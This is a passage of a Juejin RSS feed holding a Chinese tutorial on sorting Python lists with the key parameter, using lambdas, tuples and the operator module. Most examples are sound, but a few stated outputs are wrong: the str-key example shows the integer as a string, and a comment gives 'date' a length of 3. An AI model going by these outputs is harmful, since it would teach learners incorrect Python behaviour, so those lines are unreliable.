<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdatawhalechina%2Feasy-vibe" target="_blank" title="https://github.com/datawhalechina/easy-vibe" ref="nofollow noopener noreferrer">datawhalechina/easy-vibe: Vibe coding from 0 to 1 ｜把想法做成真正能上线的产品｜首个交互式教程｜零基础也能学会的 AI 编程实战</a></p>
<p>部分文字用豆包润色</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Python列表排序：用key参数掌控排序规则]]></title>    <link>https://juejin.cn/post/7605848213603287086</link>    <guid>https://juejin.cn/post/7605848213603287086</guid>    <pubDate>2026-02-13T01:15:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605848213603287086" data-draft-id="7605848213603270702" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Python列表排序：用key参数掌控排序规则"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-02-13T01:15:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="站大爷IP"/> <meta itemprop="url" content="https://juejin.cn/user/2905353241759261"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Python列表排序：用key参数掌控排序规则
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2905353241759261/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    站大爷IP
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T01:15:50.000Z" title="Fri Feb 13 2026 01:15:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>免费编程软件「python+pycharm」
链接：<a href="https://link.juejin.cn?target=https%3A%2F%2Fpan.quark.cn%2Fs%2F48a86be2fdc0" target="_blank" title="https://pan.quark.cn/s/48a86be2fdc0" ref="nofollow noopener noreferrer">pan.quark.cn/s/48a86be2f…</a></strong></p>
<p>在Python编程中，列表排序是高频操作。无论是处理用户输入的数据、分析日志文件，还是实现算法逻辑，排序都能让数据更有序、更易处理。但当列表包含混合类型元素，或需要按特定规则排序时，直接调用<code>sort()</code>或<code>sorted()</code>可能会报错或得不到预期结果。这时，<code>key</code>参数就是解决问题的关键——它能自定义排序规则，让排序逻辑更灵活。</p>
<h2 data-id="heading-0">一、基础排序：默认规则的局限性</h2>
<h3 data-id="heading-1">1.1 默认排序的“陷阱”</h3>
<p>Python的列表排序默认按元素自然顺序排列。对数字列表<code>[3, 1, 4, 2]</code>，<code>list.sort()</code>或<code>sorted()</code>会按数值大小升序排列；对字符串列表<code>['banana', 'apple', 'cherry']</code>，则按字母顺序排列。但若列表包含混合类型，如<code>['oeasy', 123]</code>，直接排序会触发<code>TypeError</code>，因为Python无法比较字符串和整数。</p>
<pre><code class="hljs language-scss" lang="scss">lst = <span class="hljs-selector-attr">[<span class="hljs-string">'oeasy'</span>, 123]</span>
lst<span class="hljs-selector-class">.sort</span>()  # 报错：TypeError: <span class="hljs-string">'&lt;'</span> not supported between instances of <span class="hljs-string">'int'</span> and <span class="hljs-string">'str'</span>
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h3 data-id="heading-2">1.2 强制类型转换的“笨办法”</h3>
<p>为解决混合类型排序问题，可先将所有元素转为同一类型（如字符串），再排序。例如：</p>
<pre><code class="hljs language-scss" lang="scss">lst = <span class="hljs-selector-attr">[<span class="hljs-string">'oeasy'</span>, 123]</span>
lst<span class="hljs-selector-class">.sort</span>(key=str)  # 将所有元素转为字符串后比较
<span class="hljs-built_in">print</span>(lst)  # 输出：<span class="hljs-selector-attr">[<span class="hljs-string">'123'</span>, <span class="hljs-string">'oeasy'</span>]</span>（因为 '<span class="hljs-number">123</span>' &lt; 'oeasy'）
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<p>但这种方法并非万能。若尝试将字符串转为整数（如<code>['999', '123']</code>转为<code>[999, 123]</code>后排序），对无法转换的字符串（如<code>['oeasy', '123']</code>）会报错。因此，强制类型转换仅适用于能安全转换的场景。</p>
<h2 data-id="heading-3">二、key参数：自定义排序的“魔法棒”</h2>
<h3 data-id="heading-4">2.1 key参数的作用原理</h3>
<p><code>key</code>参数接受一个函数，该函数会对列表中的每个元素进行处理，返回一个用于比较的值。排序时，Python会根据<code>key</code>函数返回的值而非元素本身进行比较。例如，按字符串长度排序时，<code>key=len</code>会让Python比较字符串长度而非字母顺序。</p>
<pre><code class="hljs language-scss" lang="scss">words = <span class="hljs-selector-attr">[<span class="hljs-string">'apple'</span>, <span class="hljs-string">'banana'</span>, <span class="hljs-string">'cherry'</span>, <span class="hljs-string">'date'</span>]</span>
words<span class="hljs-selector-class">.sort</span>(key=len)
<span class="hljs-built_in">print</span>(words)  # 输出：<span class="hljs-selector-attr">[<span class="hljs-string">'date'</span>, <span class="hljs-string">'apple'</span>, <span class="hljs-string">'banana'</span>, <span class="hljs-string">'cherry'</span>]</span>（长度<span class="hljs-number">3</span> &lt; <span class="hljs-number">5</span> &lt; <span class="hljs-number">6</span>）
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h3 data-id="heading-5">2.2 常见场景：按特定规则排序</h3>
<h4 data-id="heading-6">场景1：忽略大小写排序</h4>
<p>默认字符串排序区分大小写（大写字母排在小写字母前）。若需忽略大小写，可用<code>str.lower</code>作为<code>key</code>函数：</p>
<pre><code class="hljs language-scss" lang="scss">words = <span class="hljs-selector-attr">[<span class="hljs-string">'Banana'</span>, <span class="hljs-string">'apple'</span>, <span class="hljs-string">'Cherry'</span>, <span class="hljs-string">'date'</span>]</span>
words<span class="hljs-selector-class">.sort</span>(key=str.lower)
<span class="hljs-built_in">print</span>(words)  # 输出：<span class="hljs-selector-attr">[<span class="hljs-string">'apple'</span>, <span class="hljs-string">'Banana'</span>, <span class="hljs-string">'Cherry'</span>, <span class="hljs-string">'date'</span>]</span>
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h4 data-id="heading-7">场景2：按字典的某个键排序</h4>
<p>对包含字典的列表，可通过<code>key</code>指定排序依据的键。例如，按字典的<code>'age'</code>键升序排序：</p>
<pre><code class="hljs language-scss" lang="scss">data = <span class="hljs-selector-attr">[    {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Alice'</span>, <span class="hljs-string">'age'</span>: 25},    {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Bob'</span>, <span class="hljs-string">'age'</span>: 30},    {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Charlie'</span>, <span class="hljs-string">'age'</span>: 20}]</span>
sorted_data = <span class="hljs-built_in">sorted</span>(data, key=lambda x: x['age'])
<span class="hljs-built_in">print</span>(sorted_data)
# 输出：<span class="hljs-selector-attr">[{<span class="hljs-string">'name'</span>: <span class="hljs-string">'Charlie'</span>, <span class="hljs-string">'age'</span>: 20}, {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Alice'</span>, <span class="hljs-string">'age'</span>: 25}, {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Bob'</span>, <span class="hljs-string">'age'</span>: 30}]</span>
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h4 data-id="heading-8">场景3：按多条件排序</h4>
<p>若需先按一个条件排序，再按另一个条件排序，可让<code>key</code>函数返回元组。例如，先按年龄升序，再按姓名字母顺序排序：</p>
<pre><code class="hljs language-scss" lang="scss">data = <span class="hljs-selector-attr">[    {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Alice'</span>, <span class="hljs-string">'age'</span>: 25},    {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Bob'</span>, <span class="hljs-string">'age'</span>: 30},    {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Charlie'</span>, <span class="hljs-string">'age'</span>: 25}]</span>
sorted_data = <span class="hljs-built_in">sorted</span>(data, key=lambda x: (x['age'], x['name']))
<span class="hljs-built_in">print</span>(sorted_data)
# 输出：<span class="hljs-selector-attr">[{<span class="hljs-string">'name'</span>: <span class="hljs-string">'Alice'</span>, <span class="hljs-string">'age'</span>: 25}, {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Charlie'</span>, <span class="hljs-string">'age'</span>: 25}, {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Bob'</span>, <span class="hljs-string">'age'</span>: 30}]</span>
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h4 data-id="heading-9">场景4：按对象属性排序</h4>
<p>对自定义类的对象列表，可通过<code>key</code>指定排序依据的属性。例如：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):
        self.name = name
        self.age = age

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-string">f"<span class="hljs-subst">{self.name}</span>(<span class="hljs-subst">{self.age}</span>)"</span>

people = [Person(<span class="hljs-string">'Alice'</span>, <span class="hljs-number">25</span>), Person(<span class="hljs-string">'Bob'</span>, <span class="hljs-number">22</span>), Person(<span class="hljs-string">'Charlie'</span>, <span class="hljs-number">24</span>)]
sorted_people = <span class="hljs-built_in">sorted</span>(people, key=<span class="hljs-keyword">lambda</span> p: p.age)
<span class="hljs-built_in">print</span>(sorted_people)  <span class="hljs-comment"># 输出：[Bob(22), Charlie(24), Alice(25)]</span>
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h3 data-id="heading-10">2.3 高级技巧：自定义函数与operator模块</h3>
<h4 data-id="heading-11">自定义函数作为key</h4>
<p>若排序逻辑复杂，可定义独立函数作为<code>key</code>。例如，按字典的<code>'age'</code>键加权排序：</p>
<pre><code class="hljs language-scss" lang="scss">def <span class="hljs-built_in">custom_key</span>(item):
    return item[<span class="hljs-string">'age'</span>] * <span class="hljs-number">2</span> + <span class="hljs-built_in">len</span>(item[<span class="hljs-string">'name'</span>])  # 年龄乘<span class="hljs-number">2</span>加姓名长度

data = [
    {'name': <span class="hljs-string">'Alice'</span>, <span class="hljs-string">'age'</span>: <span class="hljs-number">25</span>},
    {'name': <span class="hljs-string">'Bob'</span>, <span class="hljs-string">'age'</span>: <span class="hljs-number">30</span>},
    {'name': <span class="hljs-string">'Charlie'</span>, <span class="hljs-string">'age'</span>: <span class="hljs-number">20</span>}
]
sorted_data = <span class="hljs-built_in">sorted</span>(data, key=custom_key)
<span class="hljs-built_in">print</span>(sorted_data)
# 输出：<span class="hljs-selector-attr">[{<span class="hljs-string">'name'</span>: <span class="hljs-string">'Charlie'</span>, <span class="hljs-string">'age'</span>: 20}, {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Alice'</span>, <span class="hljs-string">'age'</span>: 25}, {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Bob'</span>, <span class="hljs-string">'age'</span>: 30}]</span>
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h4 data-id="heading-12">使用operator模块</h4>
<p>Python的<code>operator</code>模块提供了<code>itemgetter</code>和<code>attrgetter</code>函数，可简化<code>key</code>函数的编写。例如，按字典的<code>'score'</code>键排序：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> <span class="hljs-keyword">operator</span>

<span class="hljs-keyword">data</span> = [
    {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Alice'</span>, <span class="hljs-string">'score'</span>: <span class="hljs-number">88</span>},
    {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Bob'</span>, <span class="hljs-string">'score'</span>: <span class="hljs-number">92</span>},
    {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Charlie'</span>, <span class="hljs-string">'score'</span>: <span class="hljs-number">85</span>}
]
sorted_data = sorted(<span class="hljs-keyword">data</span>, key=<span class="hljs-keyword">operator</span>.itemgetter(<span class="hljs-string">'score'</span>))
print(sorted_data)
# 输出：[{<span class="hljs-string">'name'</span>: <span class="hljs-string">'Charlie'</span>, <span class="hljs-string">'score'</span>: <span class="hljs-number">85</span>}, {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Alice'</span>, <span class="hljs-string">'score'</span>: <span class="hljs-number">88</span>}, {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Bob'</span>, <span class="hljs-string">'score'</span>: <span class="hljs-number">92</span>}]
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<p>对对象列表，可用<code>attrgetter</code>按属性排序：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> operator

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):
        self.name = name
        self.age = age

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-string">f"<span class="hljs-subst">{self.name}</span>(<span class="hljs-subst">{self.age}</span>)"</span>

people = [Person(<span class="hljs-string">'Alice'</span>, <span class="hljs-number">25</span>), Person(<span class="hljs-string">'Bob'</span>, <span class="hljs-number">22</span>), Person(<span class="hljs-string">'Charlie'</span>, <span class="hljs-number">24</span>)]
sorted_people = <span class="hljs-built_in">sorted</span>(people, key=operator.attrgetter(<span class="hljs-string">'age'</span>))
<span class="hljs-built_in">print</span>(sorted_people)  <span class="hljs-comment"># 输出：[Bob(22), Charlie(24), Alice(25)]</span>
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h2 data-id="heading-13">三、sort()与sorted()：选择合适的排序工具</h2>
<h3 data-id="heading-14">3.1 原地排序 vs 创建新列表</h3>
<ul>
<li><code>list.sort()</code>是列表方法，直接修改原列表，返回<code>None</code>。适用于无需保留原始顺序的场景，如数据预处理。</li>
<li><code>sorted()</code>是内置函数，返回新排序列表，原列表不变。适用于需保留原始数据的场景，如展示排序结果后继续分析原数据。</li>
</ul>

<pre><code class="hljs language-scss" lang="scss">numbers = <span class="hljs-selector-attr">[3, 1, 4, 2]</span>
sorted_numbers = <span class="hljs-built_in">sorted</span>(numbers)  # 返回新列表
<span class="hljs-built_in">print</span>(numbers)  # 输出：<span class="hljs-selector-attr">[3, 1, 4, 2]</span>（原列表未变）
<span class="hljs-built_in">print</span>(sorted_numbers)  # 输出：<span class="hljs-selector-attr">[1, 2, 3, 4]</span>

numbers<span class="hljs-selector-class">.sort</span>()  # 原地排序
<span class="hljs-built_in">print</span>(numbers)  # 输出：<span class="hljs-selector-attr">[1, 2, 3, 4]</span>（原列表已变）
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h3 data-id="heading-15">3.2 性能与内存考虑</h3>
<ul>
<li><code>list.sort()</code>因原地操作，无需创建新列表，内存效率更高，适合处理大型列表。</li>
<li><code>sorted()</code>需创建新列表，内存开销略大，但代码更安全（避免意外修改原数据）。</li>
</ul>
<h2 data-id="heading-16">四、实战案例：key参数的灵活应用</h2>
<h3 data-id="heading-17">案例1：按文件扩展名排序</h3>
<p>假设有一个文件列表，需按扩展名排序：</p>
<pre><code class="hljs language-scss" lang="scss">files = <span class="hljs-selector-attr">[<span class="hljs-string">'document.pdf'</span>, <span class="hljs-string">'image.png'</span>, <span class="hljs-string">'spreadsheet.xlsx'</span>, <span class="hljs-string">'notes.txt'</span>]</span>

def <span class="hljs-built_in">get_extension</span>(filename):
    return filename.<span class="hljs-built_in">split</span>(<span class="hljs-string">'.'</span>)[-<span class="hljs-number">1</span>]  # 提取扩展名

sorted_files = <span class="hljs-built_in">sorted</span>(files, key=get_extension)
<span class="hljs-built_in">print</span>(sorted_files)
# 输出：[<span class="hljs-string">'document.pdf'</span>, <span class="hljs-string">'image.png'</span>, <span class="hljs-string">'notes.txt'</span>, <span class="hljs-string">'spreadsheet.xlsx'</span>]（按扩展名字母顺序）
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h3 data-id="heading-18">案例2：按元组中元素优先级排序</h3>
<p>对包含元组的列表，需先按第二个元素排序，再按第一个元素排序：</p>
<pre><code class="hljs language-scss" lang="scss">tuples = <span class="hljs-selector-attr">[(<span class="hljs-string">'a'</span>, 3), (<span class="hljs-string">'b'</span>, 1), (<span class="hljs-string">'c'</span>, 2), (<span class="hljs-string">'d'</span>, 1)]</span>
sorted_tuples = <span class="hljs-built_in">sorted</span>(tuples, key=lambda x: (x[<span class="hljs-number">1</span>], x[<span class="hljs-number">0</span>]))
<span class="hljs-built_in">print</span>(sorted_tuples)
# 输出：<span class="hljs-selector-attr">[(<span class="hljs-string">'b'</span>, 1), (<span class="hljs-string">'d'</span>, 1), (<span class="hljs-string">'c'</span>, 2), (<span class="hljs-string">'a'</span>, 3)]</span>（先按第二个元素升序，再按第一个元素字母顺序）
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h3 data-id="heading-19">案例3：复杂逻辑排序</h3>
<p>假设需按以下规则排序：先按字符串长度降序，长度相同则按字母顺序升序：</p>
<pre><code class="hljs language-scss" lang="scss">words = <span class="hljs-selector-attr">[<span class="hljs-string">'apple'</span>, <span class="hljs-string">'banana'</span>, <span class="hljs-string">'cherry'</span>, <span class="hljs-string">'date'</span>, <span class="hljs-string">'fig'</span>]</span>
sorted_words = <span class="hljs-built_in">sorted</span>(words, key=lambda x: (-len(x), x))  # 长度取负实现降序
<span class="hljs-built_in">print</span>(sorted_words)
# 输出：<span class="hljs-selector-attr">[<span class="hljs-string">'banana'</span>, <span class="hljs-string">'cherry'</span>, <span class="hljs-string">'apple'</span>, <span class="hljs-string">'date'</span>, <span class="hljs-string">'fig'</span>]</span>（长度<span class="hljs-number">6</span> &gt; <span class="hljs-number">5</span> &gt; <span class="hljs-number">3</span>，长度<span class="hljs-number">5</span>的'apple' &lt; 'cherry'）
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h2 data-id="heading-20">五、总结：key参数的“核心价值”</h2>
<ul>
<li><strong>灵活性</strong>：通过自定义<code>key</code>函数，可实现任意复杂的排序逻辑，如按对象属性、字典键、计算结果等排序。</li>
<li><strong>通用性</strong>：适用于<code>list.sort()</code>和<code>sorted()</code>，覆盖原地排序和创建新列表的需求。</li>
<li><strong>可读性</strong>：结合lambda表达式或<code>operator</code>模块，代码简洁易读，避免冗长的比较函数。</li>
</ul>
<p>掌握<code>key</code>参数后，Python列表排序将不再受限于默认规则。无论是处理混合类型数据、多条件排序，还是复杂逻辑排序，<code>key</code>都能让排序变得简单高效。</p>
